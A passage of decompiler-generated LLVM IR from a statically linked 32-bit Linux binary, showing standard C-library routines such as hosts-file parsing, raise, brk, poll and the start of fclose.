  br i1 %v1_804c74c, label %dec_label_pc_804c5c3.preheader, label %dec_label_pc_804c752

dec_label_pc_804c5e4:                             ; preds = %dec_label_pc_804c5db
  %v10_804c5ec = icmp eq i8 %v2_804c5c359, 35
  %v1_804c5ef = icmp eq i1 %v10_804c5ec, false
  br i1 %v1_804c5ef, label %dec_label_pc_804c640.preheader, label %dec_label_pc_804c736.backedge

dec_label_pc_804c640.preheader:                   ; preds = %dec_label_pc_804c5e4
  %v2_804c6406 = load i8, i8* %v1_804c5c358, align 1
  %v3_804c6407 = icmp eq i8 %v2_804c6406, 0
  br i1 %v3_804c6407, label %dec_label_pc_804c64c, label %dec_label_pc_804c645

dec_label_pc_804c5f6:                             ; preds = %dec_label_pc_804c645
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_804c5fa = load i32, i32* @esp, align 4
  %v3_804c5fa = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_804c5fa = add nuw nsw i32 %v3_804c5fa, 152
  %v5_804c5fa = add i32 %v4_804c5fa, %v1_804c5fa
  %v6_804c5fa = inttoptr i32 %v5_804c5fa to i32*
  store i32 %v0_804c5fa, i32* %v6_804c5fa, align 4
  %v0_804c604.pre = load i32, i32* @ebx, align 4
  %v4_804c604.pre = load i32, i32* @ecx, align 4
  %v1_804c60461 = inttoptr i32 %v0_804c604.pre to i8*
  %v2_804c60462 = load i8, i8* %v1_804c60461, align 1
  %v3_804c60463 = zext i8 %v2_804c60462 to i32
  %v5_804c60464 = and i32 %v4_804c604.pre, -256
  %v6_804c60465 = or i32 %v3_804c60463, %v5_804c60464
  %v4_804c60666 = icmp eq i8 %v2_804c60462, 0
  br i1 %v4_804c60666, label %dec_label_pc_804c623.preheader, label %dec_label_pc_804c60a.lr.ph

dec_label_pc_804c60a.lr.ph:                       ; preds = %dec_label_pc_804c5f6
  %v0_804c60d.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804c60a

dec_label_pc_804c603:                             ; preds = %dec_label_pc_804c618
  %v1_804c603 = add i32 %v0_804c60367, 1
  store i32 %v1_804c603, i32* @ebx, align 4
  %v1_804c604 = inttoptr i32 %v1_804c603 to i8*
  %v2_804c604 = load i8, i8* %v1_804c604, align 1
  %v3_804c604 = zext i8 %v2_804c604 to i32
  %v5_804c604 = and i32 %v6_804c60469, -256
  %v6_804c604 = or i32 %v3_804c604, %v5_804c604
  %v4_804c606 = icmp eq i8 %v2_804c604, 0
  br i1 %v4_804c606, label %dec_label_pc_804c623.preheader, label %dec_label_pc_804c60a

dec_label_pc_804c60a:                             ; preds = %dec_label_pc_804c60a.lr.ph, %dec_label_pc_804c603
  %v6_804c60469 = phi i32 [ %v6_804c60465, %dec_label_pc_804c60a.lr.ph ], [ %v6_804c604, %dec_label_pc_804c603 ]
  %v2_804c60468 = phi i8 [ %v2_804c60462, %dec_label_pc_804c60a.lr.ph ], [ %v2_804c604, %dec_label_pc_804c603 ]
  %v0_804c60367 = phi i32 [ %v0_804c604.pre, %dec_label_pc_804c60a.lr.ph ], [ %v1_804c603, %dec_label_pc_804c603 ]
  %v2_804c60a = sext i8 %v2_804c60468 to i32
  store i32 %v2_804c60a, i32* @edx, align 4
  store i32 %v0_804c60d.pre, i32* @eax, align 4
  %v2_804c612 = mul nsw i32 %v2_804c60a, 2
  %v3_804c612 = add i32 %v0_804c60d.pre, %v2_804c612
  %v4_804c612 = inttoptr i32 %v3_804c612 to i8*
  %v5_804c612 = load i8, i8* %v4_804c612, align 1
  %v6_804c612 = and i8 %v5_804c612, 32
  %v7_804c612 = icmp eq i8 %v6_804c612, 0
  %v1_804c616 = icmp eq i1 %v7_804c612, false
  br i1 %v1_804c616, label %dec_label_pc_804c623.preheader, label %dec_label_pc_804c618

dec_label_pc_804c618:                             ; preds = %dec_label_pc_804c60a
  %v10_804c618 = icmp eq i8 %v2_804c60468, 10
  %v1_804c61b = icmp eq i1 %v10_804c618, false
  br i1 %v1_804c61b, label %dec_label_pc_804c603, label %dec_label_pc_804c623.preheader

dec_label_pc_804c623.preheader:                   ; preds = %dec_label_pc_804c618, %dec_label_pc_804c60a, %dec_label_pc_804c603, %dec_label_pc_804c5f6
  %v0_804c603.lcssa = phi i32 [ %v0_804c604.pre, %dec_label_pc_804c5f6 ], [ %v1_804c603, %dec_label_pc_804c603 ], [ %v0_804c60367, %dec_label_pc_804c60a ], [ %v0_804c60367, %dec_label_pc_804c618 ]
  %v6_804c604.lcssa = phi i32 [ %v6_804c60465, %dec_label_pc_804c5f6 ], [ %v6_804c604, %dec_label_pc_804c603 ], [ %v6_804c60469, %dec_label_pc_804c60a ], [ %v6_804c60469, %dec_label_pc_804c618 ]
  %v1_804c62375 = inttoptr i32 %v0_804c603.lcssa to i8*
  %v2_804c62376 = load i8, i8* %v1_804c62375, align 1
  %v3_804c62377 = zext i8 %v2_804c62376 to i32
  %v5_804c62378 = and i32 %v6_804c604.lcssa, -256
  %v6_804c62379 = or i32 %v3_804c62377, %v5_804c62378
  store i32 %v6_804c62379, i32* @ecx, align 4
  %v4_804c62580 = icmp eq i8 %v2_804c62376, 0
  br i1 %v4_804c62580, label %dec_label_pc_804c63c, label %dec_label_pc_804c629

dec_label_pc_804c61f:                             ; preds = %dec_label_pc_804c637, %dec_label_pc_804c629
  store i8 0, i8* %v1_804c62382, align 1
  %v0_804c622 = load i32, i32* @ebx, align 4
  %v1_804c622 = add i32 %v0_804c622, 1
  store i32 %v1_804c622, i32* @ebx, align 4
  %v4_804c623.pre = load i32, i32* @ecx, align 4
  %v1_804c623 = inttoptr i32 %v1_804c622 to i8*
  %v2_804c623 = load i8, i8* %v1_804c623, align 1
  %v3_804c623 = zext i8 %v2_804c623 to i32
  %v5_804c623 = and i32 %v4_804c623.pre, -256
  %v6_804c623 = or i32 %v3_804c623, %v5_804c623
  store i32 %v6_804c623, i32* @ecx, align 4
  %v4_804c625 = icmp eq i8 %v2_804c623, 0
  br i1 %v4_804c625, label %dec_label_pc_804c63c, label %dec_label_pc_804c629

dec_label_pc_804c629:                             ; preds = %dec_label_pc_804c623.preheader, %dec_label_pc_804c61f
  %v2_804c62383 = phi i8 [ %v2_804c623, %dec_label_pc_804c61f ], [ %v2_804c62376, %dec_label_pc_804c623.preheader ]
  %v1_804c62382 = phi i8* [ %v1_804c623, %dec_label_pc_804c61f ], [ %v1_804c62375, %dec_label_pc_804c623.preheader ]
  %v0_804c64081 = phi i32 [ %v1_804c622, %dec_label_pc_804c61f ], [ %v0_804c603.lcssa, %dec_label_pc_804c623.preheader ]
  %v2_804c629 = sext i8 %v2_804c62383 to i32
  store i32 %v2_804c629, i32* @edx, align 4
  %v0_804c62c = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804c62c, i32* @eax, align 4
  %v2_804c631 = mul nsw i32 %v2_804c629, 2
  %v3_804c631 = add i32 %v0_804c62c, %v2_804c631
  %v4_804c631 = inttoptr i32 %v3_804c631 to i8*
  %v5_804c631 = load i8, i8* %v4_804c631, align 1
  %v6_804c631 = and i8 %v5_804c631, 32
  %v7_804c631 = icmp eq i8 %v6_804c631, 0
  %v1_804c635 = icmp eq i1 %v7_804c631, false
  br i1 %v1_804c635, label %dec_label_pc_804c61f, label %dec_label_pc_804c637

dec_label_pc_804c637:                             ; preds = %dec_label_pc_804c629
  %v10_804c637 = icmp eq i8 %v2_804c62383, 10
  br i1 %v10_804c637, label %dec_label_pc_804c61f, label %dec_label_pc_804c63c

dec_label_pc_804c63c:                             ; preds = %dec_label_pc_804c61f, %dec_label_pc_804c637, %dec_label_pc_804c623.preheader
  %v0_804c640.lcssa = phi i32 [ %v0_804c603.lcssa, %dec_label_pc_804c623.preheader ], [ %v0_804c64081, %dec_label_pc_804c637 ], [ %v1_804c622, %dec_label_pc_804c61f ]
  %v1_804c623.lcssa = phi i8* [ %v1_804c62375, %dec_label_pc_804c623.preheader ], [ %v1_804c62382, %dec_label_pc_804c637 ], [ %v1_804c623, %dec_label_pc_804c61f ]
  %v4_804c63c = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_804c640 = load i8, i8* %v1_804c623.lcssa, align 1
  %v3_804c640 = icmp eq i8 %v2_804c640, 0
  br i1 %v3_804c640, label %dec_label_pc_804c64c, label %dec_label_pc_804c645

dec_label_pc_804c645:                             ; preds = %dec_label_pc_804c640.preheader, %dec_label_pc_804c63c
  %v0_804c5fa = phi i32 [ %v0_804c640.lcssa, %dec_label_pc_804c63c ], [ %v0_804c5c257, %dec_label_pc_804c640.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_804c63c, %dec_label_pc_804c63c ], [ 0, %dec_label_pc_804c640.preheader ]
  %v7_804c64a = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_804c64a, label %dec_label_pc_804c64c, label %dec_label_pc_804c5f6

dec_label_pc_804c64c:                             ; preds = %dec_label_pc_804c63c, %dec_label_pc_804c645, %dec_label_pc_804c640.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_804c640.preheader ], [ %v4_804c63c, %dec_label_pc_804c63c ], [ %stack_var_-196.013, %dec_label_pc_804c645 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_804c653 = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_80505f5.92 to i32), i32* %stack_var_-216, align 4
  %v5_804c65b = call i32 @__GI_strcoll(i8* %v4_804c65b, i32 ptrtoint ([11 x i8]* @global_var_80505f5.92 to i32), i32 %v0_804c653, i32 %v0_804c653)
  store i32 %v5_804c65b, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_804c668 = icmp eq i32 %v5_804c65b, 0
  br i1 %v1_804c668, label %dec_label_pc_804c690.preheader, label %dec_label_pc_804c6a1

dec_label_pc_804c690.preheader:                   ; preds = %dec_label_pc_804c64c
  %v5_804c69490 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804c69490, label %dec_label_pc_804c696.lr.ph, label %dec_label_pc_804c6a1

dec_label_pc_804c696.lr.ph:                       ; preds = %dec_label_pc_804c690.preheader
  %v0_804c696.pre = load i32, i32* @global_var_8054994.33, align 4
  br label %dec_label_pc_804c696

dec_label_pc_804c66e:                             ; preds = %dec_label_pc_804c696
  %v2_804c671 = mul i32 %v1_804c67191, 4
  %v4_804c671 = add i32 %v2_804c671, %v3_804c671
  %v5_804c671 = inttoptr i32 %v4_804c671 to i32*
  %v6_804c671 = load i32, i32* %v5_804c671, align 4
  %v1_804c678 = inttoptr i32 %v6_804c671 to i8*
  %v2_804c678 = call i32 @__GI_strdup(i8* %v1_804c678)
  %v0_804c67d = load i32, i32* @esi, align 4
  %v1_804c67d = add i32 %v0_804c67d, 1
  store i32 %v1_804c67d, i32* @esi, align 4
  %v1_804c67e = load i32, i32* @ebx, align 4
  %v2_804c67e = mul i32 %v1_804c67e, 4
  %v3_804c67e = add i32 %v2_804c67e, 134564232
  %v4_804c67e = inttoptr i32 %v3_804c67e to i32*
  store i32 %v2_804c678, i32* %v4_804c67e, align 4
  %v0_804c685 = load i32, i32* @ebx, align 4
  %v1_804c685 = add i32 %v0_804c685, 1
  store i32 %v1_804c685, i32* @eax, align 4
  store i32 %v1_804c685, i32* @global_var_8054994.33, align 4
  %v0_804c690.pre = load i32, i32* @esi, align 4
  %v5_804c694 = icmp slt i32 %v0_804c690.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804c694, label %dec_label_pc_804c696, label %dec_label_pc_804c6a1

dec_label_pc_804c696:                             ; preds = %dec_label_pc_804c696.lr.ph, %dec_label_pc_804c66e
  %v0_804c696 = phi i32 [ %v0_804c696.pre, %dec_label_pc_804c696.lr.ph ], [ %v1_804c685, %dec_label_pc_804c66e ]
  %v1_804c67191 = phi i32 [ 1, %dec_label_pc_804c696.lr.ph ], [ %v0_804c690.pre, %dec_label_pc_804c66e ]
  store i32 %v0_804c696, i32* @ebx, align 4
  %v7_804c69f = icmp sgt i32 %v0_804c696, 2
  br i1 %v7_804c69f, label %dec_label_pc_804c6a1, label %dec_label_pc_804c66e

dec_label_pc_804c6a1:                             ; preds = %dec_label_pc_804c690.preheader, %dec_label_pc_804c66e, %dec_label_pc_804c696, %dec_label_pc_804c64c
  %v0_804c6a1 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050600.93 to i32), i32* %stack_var_-216, align 4
  %v0_804c6a8 = load i32, i32* @edi, align 4
  %v4_804c6a9 = inttoptr i32 %v0_804c6a8 to i8*
  %v5_804c6a9 = call i32 @__GI_strcoll(i8* %v4_804c6a9, i32 ptrtoint ([7 x i8]* @global_var_8050600.93 to i32), i32 %v0_804c6a1, i32 %v0_804c6a1)
  store i32 %v5_804c6a9, i32* @eax, align 4
  %v1_804c6b1 = icmp eq i32 %v5_804c6a9, 0
  br i1 %v1_804c6b1, label %dec_label_pc_804c6f3.preheader, label %dec_label_pc_804c6b5

dec_label_pc_804c6b5:                             ; preds = %dec_label_pc_804c6a1
  %v0_804c6b5 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050607.94 to i32), i32* %stack_var_-216, align 4
  %v0_804c6bc = load i32, i32* @edi, align 4
  %v4_804c6bd = inttoptr i32 %v0_804c6bc to i8*
  %v5_804c6bd = call i32 @__GI_strcoll(i8* %v4_804c6bd, i32 ptrtoint ([7 x i8]* @global_var_8050607.94 to i32), i32 %v0_804c6b5, i32 %v0_804c6b5)
  %v1_804c6c5 = icmp eq i32 %v5_804c6bd, 0
  br i1 %v1_804c6c5, label %dec_label_pc_804c6f3.preheader, label %dec_label_pc_804c736.backedge

dec_label_pc_804c6f3.preheader:                   ; preds = %dec_label_pc_804c6a1, %dec_label_pc_804c6b5
  %v0_804c6f392 = load i32, i32* @global_var_8054998.87, align 8
  %tmp4594 = icmp slt i32 %v0_804c6f392, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_804c6cb, label %dec_label_pc_804c6fc

dec_label_pc_804c6cb:                             ; preds = %dec_label_pc_804c6f3.preheader, %dec_label_pc_804c6cb.dec_label_pc_804c6cb_crit_edge
  %v0_804c6f396 = phi i32 [ %v0_804c6f3, %dec_label_pc_804c6cb.dec_label_pc_804c6cb_crit_edge ], [ %v0_804c6f392, %dec_label_pc_804c6f3.preheader ]
  %v1_804c6cb = add i32 %v0_804c6f396, -1
  store i32 %v1_804c6cb, i32* @global_var_8054998.87, align 8
  %v1_804c6d4 = mul i32 %v1_804c6cb, 4
  %v2_804c6d4 = add i32 %v1_804c6d4, 134564216
  %v3_804c6d4 = inttoptr i32 %v2_804c6d4 to i32*
  %v4_804c6d4 = load i32, i32* %v3_804c6d4, align 4
  %v1_804c6db = call i32 @free(i32 %v4_804c6d4)
  %v0_804c6e0 = load i32, i32* @global_var_8054998.87, align 8
  %v1_804c6e8 = mul i32 %v0_804c6e0, 4
  %v2_804c6e8 = add i32 %v1_804c6e8, ptrtoint (i32* @global_var_8054978.95 to i32)
  %v3_804c6e8 = inttoptr i32 %v2_804c6e8 to i32*
  store i32 0, i32* %v3_804c6e8, align 4
  %v0_804c6f3 = load i32, i32* @global_var_8054998.87, align 8
  %tmp45 = icmp slt i32 %v0_804c6f3, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_804c6cb.dec_label_pc_804c6cb_crit_edge, label %dec_label_pc_804c6fc

dec_label_pc_804c6cb.dec_label_pc_804c6cb_crit_edge: ; preds = %dec_label_pc_804c6cb
  br label %dec_label_pc_804c6cb

dec_label_pc_804c6fc:                             ; preds = %dec_label_pc_804c6cb, %dec_label_pc_804c6f3.preheader
  %v0_804c6f3.lcssa = phi i32 [ %v0_804c6f392, %dec_label_pc_804c6f3.preheader ], [ %v0_804c6f3, %dec_label_pc_804c6cb ]
  store i32 1, i32* @esi, align 4
  %v5_804c729100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804c729100, label %dec_label_pc_804c72b, label %dec_label_pc_804c736.backedge

dec_label_pc_804c703:                             ; preds = %dec_label_pc_804c72b
  %v2_804c706 = mul i32 %v1_804c706102, 4
  %v4_804c706 = add i32 %v2_804c706, %v3_804c671
  %v5_804c706 = inttoptr i32 %v4_804c706 to i32*
  %v6_804c706 = load i32, i32* %v5_804c706, align 4
  %v1_804c70d = inttoptr i32 %v6_804c706 to i8*
  %v2_804c70d = call i32 @__GI_strdup(i8* %v1_804c70d)
  %v0_804c712 = load i32, i32* @esi, align 4
  %v1_804c712 = add i32 %v0_804c712, 1
  store i32 %v1_804c712, i32* @esi, align 4
  %v1_804c713 = load i32, i32* @ebx, align 4
  %v2_804c713 = mul i32 %v1_804c713, 4
  %v3_804c713 = add i32 %v2_804c713, 134564216
  %v4_804c713 = inttoptr i32 %v3_804c713 to i32*
  store i32 %v2_804c70d, i32* %v4_804c713, align 4
  %v0_804c71a = load i32, i32* @ebx, align 4
  %v1_804c71a = add i32 %v0_804c71a, 1
  store i32 %v1_804c71a, i32* @global_var_8054998.87, align 8
  %v0_804c725.pre = load i32, i32* @esi, align 4
  %v5_804c729 = icmp slt i32 %v0_804c725.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804c729, label %dec_label_pc_804c72b, label %dec_label_pc_804c736.backedge

dec_label_pc_804c72b:                             ; preds = %dec_label_pc_804c6fc, %dec_label_pc_804c703
  %v1_804c706102 = phi i32 [ %v0_804c725.pre, %dec_label_pc_804c703 ], [ 1, %dec_label_pc_804c6fc ]
  %v0_804c72b101 = phi i32 [ %v1_804c71a, %dec_label_pc_804c703 ], [ %v0_804c6f3.lcssa, %dec_label_pc_804c6fc ]
  store i32 %v0_804c72b101, i32* @ebx, align 4
  %v7_804c734 = icmp sgt i32 %v0_804c72b101, 3
  br i1 %v7_804c734, label %dec_label_pc_804c736.backedge, label %dec_label_pc_804c703

dec_label_pc_804c5c3.preheader:                   ; preds = %dec_label_pc_804c5c3.preheader.lr.ph, %dec_label_pc_804c736.backedge
  %v0_804c5c3.pre = load i32, i32* @ebx, align 4
  %v4_804c5c3.pre = load i32, i32* @ecx, align 4
  %v1_804c5c351 = inttoptr i32 %v0_804c5c3.pre to i8*
  %v2_804c5c352 = load i8, i8* %v1_804c5c351, align 1
  %v3_804c5c353 = zext i8 %v2_804c5c352 to i32
  %v5_804c5c354 = and i32 %v4_804c5c3.pre, -256
  %v6_804c5c355 = or i32 %v3_804c5c353, %v5_804c5c354
  store i32 %v6_804c5c355, i32* @ecx, align 4
  %v4_804c5c556 = icmp eq i8 %v2_804c5c352, 0
  br i1 %v4_804c5c556, label %dec_label_pc_804c736.backedge, label %dec_label_pc_804c5cd.lr.ph

dec_label_pc_804c5cd.lr.ph:                       ; preds = %dec_label_pc_804c5c3.preheader
  %v0_804c5d0.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804c5cd

dec_label_pc_804c752:                             ; preds = %dec_label_pc_804c736.backedge, %dec_label_pc_804c736.preheader
  %v0_804c755 = load i32, i32* @ebp, align 4
  %v1_804c756 = inttoptr i32 %v0_804c755 to i16*
  %v2_804c756 = call i32 @__GI_fclose(i16* %v1_804c756)
  br label %dec_label_pc_804c76b

dec_label_pc_804c760:                             ; preds = %dec_label_pc_804c59f
  %v0_804c760 = call i32 @__GI___h_errno_location()
  %v1_804c765 = inttoptr i32 %v0_804c760 to i32*
  store i32 3, i32* %v1_804c765, align 4
  br label %dec_label_pc_804c76b

dec_label_pc_804c76b:                             ; preds = %entry, %dec_label_pc_804c752, %dec_label_pc_804c760
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_804c558, i32* @eax, align 4
  %v2_804c777 = call i32 @__pthread_return_void(i32 %v2_804c558, i32 1)
  store i32 %v0_804c544, i32* @ebp, align 4
  ret i32 %v2_804c777

; uselistorder directives
  uselistorder i32 %v0_804c5d0.pre, { 1, 0 }
  uselistorder i32 %v6_804c5c355, { 1, 0 }
  uselistorder i8 %v2_804c5c352, { 1, 2, 0 }
  uselistorder i8* %v1_804c5c351, { 1, 0 }
  uselistorder i32 %v0_804c5c3.pre, { 1, 0 }
  uselistorder i32 %v0_804c6f3, { 0, 2, 1 }
  uselistorder i32 %v1_804c6cb, { 1, 0 }
  uselistorder i32 %v0_804c696, { 1, 0 }
  uselistorder i32 %v0_804c690.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804c629, { 1, 0 }
  uselistorder i8 %v2_804c62383, { 1, 0 }
  uselistorder i32 %v2_804c60a, { 1, 0 }
  uselistorder i8 %v2_804c60468, { 1, 0 }
  uselistorder i32 %v1_804c603, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804c5cd, { 1, 0 }
  uselistorder i32 %v1_804c5c2, { 1, 0, 2 }
  uselistorder i32 %v2_804c73d, { 2, 3, 0, 1 }
  uselistorder i32 %v2_804c5ab, { 1, 0 }
  uselistorder i32 %v2_804c58d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_8054998.87, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8054994.33, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8052160.32 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_804c76b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c5c3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c72b, { 1, 0 }
  uselistorder label %dec_label_pc_804c6cb, { 1, 0 }
  uselistorder label %dec_label_pc_804c6f3.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c6a1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c696, { 1, 0 }
  uselistorder label %dec_label_pc_804c64c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c645, { 1, 0 }
  uselistorder label %dec_label_pc_804c63c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c629, { 1, 0 }
  uselistorder label %dec_label_pc_804c60a, { 1, 0 }
  uselistorder label %dec_label_pc_804c736.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_804c736.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_804c7ab = inttoptr i32 %arg3 to i32*
  %v10_804c7ab = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_804c7ab, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_804c7ab
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804c7b7 = call i32 @__libc_getpid()
  %v2_804c7c3 = call i32 @kill(i32 %v0_804c7b7, i32 %arg1)
  ret i32 %v2_804c7c3

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 1, 3, 2, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_804c7cc = load i32, i32* @eax, align 4
  %v1_804c7cc = add i32 %v0_804c7cc, 28
  %v2_804c7cc = inttoptr i32 %v1_804c7cc to i32*
  %v3_804c7cc = load i32, i32* %v2_804c7cc, align 4
  store i32 %v3_804c7cc, i32* @global_var_805499c.96, align 4
  %v1_804c7d5 = add i32 %v0_804c7cc, 44
  %v2_804c7d5 = inttoptr i32 %v1_804c7d5 to i32*
  %v3_804c7d5 = load i32, i32* %v2_804c7d5, align 4
  store i32 %v3_804c7d5, i32* @global_var_80549a0.97, align 32
  ret i32 %v3_804c7d5
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c7e0 = load i32, i32* @ebx, align 4
  store i32 %v0_804c7e0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804c7f3 = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c7f3, i32* @global_var_8052544.82, align 4
  %v7_804c7fe = icmp ult i32 %v1_804c7f3, %arg1
  %v1_804c800 = icmp eq i1 %v7_804c7fe, false
  br i1 %v1_804c800, label %dec_label_pc_804c810, label %dec_label_pc_804c802

dec_label_pc_804c802:                             ; preds = %entry
  %v0_804c802 = load i32, i32* %stack_var_-4, align 4
  %v1_804c802 = call i32 @__errno_location(i32 %v0_804c802)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804c80a = inttoptr i32 %v1_804c802 to i32*
  store i32 12, i32* %v1_804c80a, align 4
  %v0_804c810.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c810

dec_label_pc_804c810:                             ; preds = %entry, %dec_label_pc_804c802
  %v0_804c810 = phi i32 [ 0, %entry ], [ %v0_804c810.pre, %dec_label_pc_804c802 ]
  %v2_804c814 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c814, i32* @ebx, align 4
  ret i32 %v0_804c810

; uselistorder directives
  uselistorder i32 %v1_804c7f3, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8052544.82, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c810, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_804c81b = load i32, i32* @eax, align 4
  %v1_804c81d = sub i32 0, %v0_804c81b
  %v1_804c81f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_804c824 = inttoptr i32 %v1_804c81f to i32*
  store i32 %v1_804c81d, i32* %v2_804c824, align 4
  ret i32 -1
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804c830 = load i32, i32* @edi, align 4
  store i32 %v0_804c830, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_804c840 = load i32, i32* @ebx, align 4
  %v1_804c841 = inttoptr i32 %tmp4 to %pollfd*
  %v5_804c848 = call i32 @poll(%pollfd* %v1_804c841, i32 %tmp3, i32 %tmp)
  store i32 %v0_804c840, i32* @ebx, align 4
  store i32 %v5_804c848, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_804c848, -4095
  br i1 %tmp10, label %dec_label_pc_804c860, label %dec_label_pc_804c854

dec_label_pc_804c854:                             ; preds = %entry
  %v1_804c854 = call i32 @__errno_location(i32 %v0_804c840)
  %v0_804c859 = load i32, i32* %edi.global-to-local, align 4
  %v1_804c859 = sub i32 0, %v0_804c859
  %v2_804c85b = inttoptr i32 %v1_804c854 to i32*
  store i32 %v1_804c859, i32* %v2_804c85b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804c860

dec_label_pc_804c860:                             ; preds = %entry, %dec_label_pc_804c854
  %v0_804c860 = phi i32 [ %v5_804c848, %entry ], [ -1, %dec_label_pc_804c854 ]
  %v2_804c864 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c864, i32* @edi, align 4
  ret i32 %v0_804c860

; uselistorder directives
  uselistorder i32 %v5_804c848, { 1, 0, 2 }
  uselistorder i32 %v0_804c840, { 1, 0 }
  uselistorder label %dec_label_pc_804c860, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_804c86f = ptrtoint i16* %arg1 to i32
  store i32 %v4_804c86f, i32* @esi, align 4
  %v1_804c873 = add i32 %v4_804c86f, 52
  %v2_804c873 = inttoptr i32 %v1_804c873 to i32*
  %v3_804c873 = load i32, i32* %v2_804c873, align 4
  store i32 %v3_804c873, i32* @ebp, align 4
  %v1_804c876 = icmp eq i32 %v3_804c873, 0
  %v1_804c878 = icmp eq i1 %v1_804c876, false
  br i1 %v1_804c878, label %dec_label_pc_804c899, label %dec_label_pc_804c87a

dec_label_pc_804c87a:                             ; preds = %entry
  %v1_804c87a = add i32 %v4_804c86f, 56
  store i32 %v1_804c87a, i32* @ebx, align 4
  %v2_804c884 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c884, i32* @eax, align 4
  %v2_804c889 = call i32 @__pthread_return_void(i32 %v2_804c884, i32 134526403)
  %v0_804c88e = load i32, i32* @ebx, align 4
  %v1_804c891 = call i32 @__pthread_return_0(i32 %v0_804c88e)
  store i32 %v1_804c891, i32* @eax, align 4
  %v0_804c89b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c899

dec_label_pc_804c899:                             ; preds = %entry, %dec_label_pc_804c87a
  %v0_804c8a3 = phi i32 [ %v4_804c86f, %entry ], [ %v0_804c89b.pre, %dec_label_pc_804c87a ]
  store i32 0, i32* @edi, align 4
  %v1_804c89b = inttoptr i32 %v0_804c8a3 to i8*
  %v2_804c89b = load i8, i8* %v1_804c89b, align 1
